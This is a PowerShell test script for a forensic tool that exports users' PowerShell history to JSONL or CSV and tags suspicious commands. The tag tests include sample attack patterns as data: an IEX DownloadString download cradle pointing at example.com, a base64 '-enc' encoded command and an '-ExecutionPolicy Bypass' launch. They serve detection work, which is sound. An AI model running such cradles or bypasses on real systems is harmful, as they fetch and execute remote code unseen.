#Requires -Version 5.1
<#
.SYNOPSIS
    Dependency-free tests for Export-PSHistory.ps1. Exit code 1 on any failure.
    Run: pwsh ./Test-ExportPSHistory.ps1   (or powershell.exe on Windows)
#>
$ErrorActionPreference = 'Stop'
$testDir = $PSScriptRoot
$exporter = Join-Path -Path (Split-Path -Path $testDir -Parent) -ChildPath 'Export-PSHistory.ps1'

. $exporter                                             # functions only; main is skipped
. (Join-Path -Path $testDir -ChildPath 'New-FakePSHistoryProfiles.ps1')

$script:Passed = 0
$script:Failed = 0

function Assert-That {
    param([bool]$Condition, [string]$Message)
    if ($Condition) {
        $script:Passed++
        Write-Host "  ok   $Message"
    }
    else {
        $script:Failed++
        Write-Host "  FAIL $Message" -ForegroundColor Red
    }
}

function Read-Jsonl {
    param([string]$Path)
    $lines = [System.IO.File]::ReadAllLines($Path, (New-Object System.Text.UTF8Encoding($false)))
    @($lines | Where-Object { $_ } | ForEach-Object { $_ | ConvertFrom-Json })
}

function Get-FileState {
    param([string[]]$Paths)
    @($Paths | ForEach-Object {
            $i = Get-Item -LiteralPath $_
            '{0}|{1}|{2}' -f $_, (Get-FileHash -LiteralPath $_ -Algorithm SHA256).Hash, $i.LastWriteTimeUtc.Ticks
        }) -join "`n"
}

# ---------------------------------------------------------------- parser unit tests
Write-Host '[parser]'
$lines = @('Get-Process', '', 'Get-Service |`', '  Where-Object Status -eq Running |`', '  Select-Object -First 1', 'hostname', '')
$cmds = @(ConvertFrom-PSHistoryLine -Line $lines)
Assert-That ($cmds.Count -eq 3) 'blank lines skipped, multi-line joined into 3 commands'
Assert-That ($cmds[1].LineCount -eq 3 -and $cmds[1].LineNumber -eq 3) 'multi-line command reports start line 3 and 3 lines'
Assert-That ($cmds[1].Command -eq "Get-Service |`n  Where-Object Status -eq Running |`n  Select-Object -First 1") 'continuation backticks removed, newlines preserved'
Assert-That (@(ConvertFrom-PSHistoryLine -Line @()).Count -eq 0) 'empty input gives no commands'
$tail = @(ConvertFrom-PSHistoryLine -Line @('echo hi`'))
Assert-That ($tail.Count -eq 1 -and $tail[0].Command -eq 'echo hi`') 'trailing backtick on the final line is kept, not treated as continuation'

# ---------------------------------------------------------------- tag unit tests
Write-Host '[tags]'
$enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Write-Host 'x'"))
Assert-That (@(Get-PSHistoryTag -Command "powershell -nop -enc $enc") -contains 'encoded_command') 'detects -enc <base64>'
Assert-That (@(Get-PSHistoryTag -Command "IEX (New-Object Net.WebClient).DownloadString('https://example.com/a')") -contains 'download_cradle') 'detects DownloadString cradle'
Assert-That (@(Get-PSHistoryTag -Command 'iex $x') -contains 'invoke_expression') 'detects iex'
Assert-That (@(Get-PSHistoryTag -Command 'Get-ChildItem C:\Temp').Count -eq 0) 'benign command gets no tags'
Assert-That (@(Get-PSHistoryTag -Command 'Get-Index -Name test').Count -eq 0) 'word containing "ex" is not flagged as iex'
Assert-That (@(Get-PSHistoryTag -Command 'powershell -ExecutionPolicy Bypass -File x.ps1') -contains 'execution_policy_bypass') 'detects -ExecutionPolicy Bypass'

# ---------------------------------------------------------------- end-to-end
$work = Join-Path -Path ([System.IO.Path]::GetTempPath()) -ChildPath ('psh_test_' + [guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $work | Out-Null
try {
    $fx = New-FakePSHistoryProfiles -Root $work
    $allFiles = @($fx.AliceFile, $fx.BobConsoleFile, $fx.BobCodeFile, $fx.DaveFile)
    $before = Get-FileState -Paths $allFiles

    Write-Host '[end-to-end: JSONL]'
    $out = Join-Path -Path $work -ChildPath 'out.jsonl'
    $summary = & $exporter -UsersRoot $fx.UsersRoot -OutputPath $out -HostLabel 'TESTHOST' -WarningAction SilentlyContinue
    $recs = Read-Jsonl -Path $out

    Assert-That ($summary.Commands -eq $fx.ExpectedCommands) "summary reports $($fx.ExpectedCommands) commands"
    Assert-That ($recs.Count -eq $fx.ExpectedCommands) 'one JSON line per command'
    Assert-That ($summary.HistoryFiles -eq $fx.ExpectedFiles) "reads $($fx.ExpectedFiles) history files (console + VS Code host, both OS layouts)"
    Assert-That ((@($summary.Users) -join ',') -eq ($fx.ExpectedUsers -join ',')) 'users alice, bob, dave found; carol (no history) absent'
    Assert-That (@($recs | Where-Object { $_.hostname -ne 'TESTHOST' }).Count -eq 0) 'HostLabel applied to every record'
    Assert-That (@($recs | Where-Object { $_.user -eq 'carol' }).Count -eq 0) 'no records for user without history'
    Assert-That (-not ($recs[0].PSObject.Properties.Name -contains 'tags')) 'no tags field unless -AddTags'

    $multi = @($recs | Where-Object { $_.command -like "Get-Service*" })
    Assert-That ($multi.Count -eq 1 -and $multi[0].line_count -eq 3 -and $multi[0].line_number -eq 6) 'CRLF file: multi-line command reassembled (start line 6, 3 lines)'
    Assert-That ($multi[0].command.Contains("`n")) 'multi-line command keeps embedded newlines'

    $dave = @($recs | Where-Object { $_.user -eq 'dave' })
    Assert-That ($dave.Count -eq 3 -and $dave[0].command -eq 'whoami /all') 'UTF-8 BOM stripped from first command; blank lines skipped'
    $nonAscii = [string]([char]0x00FC) + 'n'
    Assert-That ($dave[2].command.Contains($nonAscii)) 'non-ASCII characters preserved (dave)'
    $jp = [string]([char]0x65E5) + [char]0x672C
    Assert-That (@($recs | Where-Object { $_.history_host -eq 'Visual Studio Code Host' -and $_.command.Contains($jp) }).Count -eq 1) 'non-ASCII preserved in VS Code host file'

    $aliceFirst = @($recs | Where-Object { $_.user -eq 'alice' })[0]
    $expectedHash = (Get-FileHash -LiteralPath $fx.AliceFile -Algorithm SHA256).Hash.ToLowerInvariant()
    Assert-That ($aliceFirst.file_sha256 -eq $expectedHash) 'file_sha256 matches the source file'
    Assert-That ($aliceFirst.command_index -eq 1 -and $aliceFirst.line_number -eq 1) 'command_index and line_number start at 1'

    $raw = [System.IO.File]::ReadAllBytes($out)
    Assert-That (-not ($raw.Length -ge 3 -and $raw[0] -eq 0xEF -and $raw[1] -eq 0xBB -and $raw[2] -eq 0xBF)) 'output has no UTF-8 BOM'

    $sidecar = [System.IO.File]::ReadAllText("$out.sha256").Trim()
    $actual = (Get-FileHash -LiteralPath $out -Algorithm SHA256).Hash.ToLowerInvariant()
    Assert-That ($sidecar -eq "$actual  out.jsonl") 'sidecar .sha256 matches output (sha256sum format)'
    Assert-That ($summary.Sha256 -eq $actual) 'summary hash matches output'

    Write-Host '[safety]'
    Assert-That ((Get-FileState -Paths $allFiles) -eq $before) 'source history files unchanged (content and mtime)'
    $threw = $false
    try { & $exporter -UsersRoot $fx.UsersRoot -OutputPath $out -WarningAction SilentlyContinue | Out-Null } catch { $threw = $true }
    Assert-That $threw 'refuses to overwrite existing output without -Force'
    $again = & $exporter -UsersRoot $fx.UsersRoot -OutputPath $out -Force -WarningAction SilentlyContinue
    Assert-That ($again.Commands -eq $fx.ExpectedCommands) '-Force overwrites'

    Write-Host '[tags / dedupe / errors]'
    $outTags = Join-Path -Path $work -ChildPath 'tags.jsonl'
    $s2 = & $exporter -UsersRoot $fx.UsersRoot -OutputPath $outTags -AddTags -ExtraHistoryPath $fx.AliceFile, (Join-Path -Path $work -ChildPath 'nope_history.txt') -WarningAction SilentlyContinue
    $tagRecs = Read-Jsonl -Path $outTags
    Assert-That ($s2.Commands -eq $fx.ExpectedCommands) 'explicit path to an already-found file is not double counted'
    Assert-That ($s2.Errors.Count -eq 1 -and $s2.Errors[0] -like '*not found*') 'missing explicit file reported in Errors, collection continues'
    $encRec = @($tagRecs | Where-Object { $_.command -like '*-EncodedCommand*' })
    Assert-That ($encRec.Count -eq 1 -and @($encRec[0].tags) -contains 'encoded_command') '-AddTags marks the encoded command'
    $benign = @($tagRecs | Where-Object { $_.command -eq 'Get-Process' })
    Assert-That ($benign.Count -eq 1 -and @($benign[0].tags).Count -eq 0) 'benign command has empty tags array'

    Write-Host '[end-to-end: CSV]'
    $outCsv = Join-Path -Path $work -ChildPath 'out.csv'
    $s3 = & $exporter -UsersRoot $fx.UsersRoot -OutputPath $outCsv -Format CSV -AddTags -WarningAction SilentlyContinue
    $csv = @(Import-Csv -LiteralPath $outCsv -Encoding UTF8)
    Assert-That ($csv.Count -eq $fx.ExpectedCommands -and $s3.Commands -eq $fx.ExpectedCommands) 'CSV has one row per command'
    $csvMulti = @($csv | Where-Object { $_.command -like 'Get-Service*' })
    Assert-That ($csvMulti.Count -eq 1 -and $csvMulti[0].command.Contains("`n")) 'CSV preserves multi-line commands inside quoted field'
    $csvEnc = @($csv | Where-Object { $_.tags -like '*encoded_command*' })
    Assert-That ($csvEnc.Count -eq 1) 'CSV tags column populated (semicolon-separated)'
}
finally {
    Remove-Item -LiteralPath $work -Recurse -Force -ErrorAction SilentlyContinue
}

Write-Host ''
Write-Host ("{0} passed, {1} failed" -f $script:Passed, $script:Failed)
if ($script:Failed -gt 0) { exit 1 }
